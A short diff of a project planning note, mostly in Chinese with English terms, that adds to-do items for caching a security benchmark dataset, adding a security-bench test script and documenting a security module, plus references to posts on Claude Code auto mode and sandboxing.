+- [ ] Cache BrowseSafe-Bench dataset，用于 offline CI
+- [ ] 把 `test:security-bench` script 加到 package.json
+- [ ] 更新 CLAUDE.md，加入 security module documentation
 
-## References
+## References（参考资料）
 
 - [Claude Code Auto Mode](https://www.anthropic.com/engineering/claude-code-auto-mode)
 - [Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
